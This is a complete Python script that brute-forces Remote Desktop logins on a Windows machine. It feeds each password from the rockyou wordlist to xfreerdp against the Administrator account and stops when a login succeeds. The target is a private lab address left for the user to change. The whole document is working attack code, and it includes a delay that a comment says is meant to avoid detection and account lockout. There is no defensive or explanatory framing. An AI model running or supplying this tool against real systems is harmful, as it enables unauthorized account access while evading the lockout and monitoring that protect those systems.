import subprocess
import time

# Configuration
target_ip = "192.168.56.102"  # ← Change to your Windows IP
username = "Administrator"    # ← Change to your Windows username
wordlist_path = "/usr/share/wordlists/rockyou.txt"  # Or any other list

# Open and read the wordlist
try:
    with open(wordlist_path, "r", encoding="latin-1") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"[!] Wordlist not found at: {wordlist_path}")
    exit(1)

print(f"[*] Starting brute-force on {target_ip} with user '{username}'...")

for count, password in enumerate(passwords, 1):
    print(f"[{count}] Trying: {password}")

    try:
        result = subprocess.run(
            ["xfreerdp", f"/v:{target_ip}", f"/u:{username}", f"/p:{password}", "/cert:ignore"],
            capture_output=True,
            text=True,
            timeout=10
        )

        if "Authentication only, exit status 0" in result.stderr or result.returncode == 0:
            print(f"\n[+] SUCCESS! Password found: {password}")
            break
        else:
            # Optional: print this only if needed to reduce noise
            pass

    except subprocess.TimeoutExpired:
        print("[!] Timeout occurred, skipping...")
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        break
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

    # Sleep a bit to avoid detection/lockout (optional)
    time.sleep(0.5)

else:
    print("[-] Password not found in wordlist.")
